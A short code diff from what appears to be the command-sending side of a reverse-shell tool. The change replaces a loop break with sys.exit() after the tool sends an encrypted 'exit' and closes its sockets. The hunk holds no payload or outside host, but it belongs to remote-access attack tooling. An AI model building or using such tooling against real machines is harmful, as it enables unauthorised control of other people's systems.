@@ -106,7 +106,7 @@ def main():
                     connection.send(encryption_handler('exit', encode=True))
                     connection.close()
                     rev_socket.close()
-                    break
+                    sys.exit()
                 if not command.strip():
                     continue
                 connection.send(encryption_handler(command, encode=True))
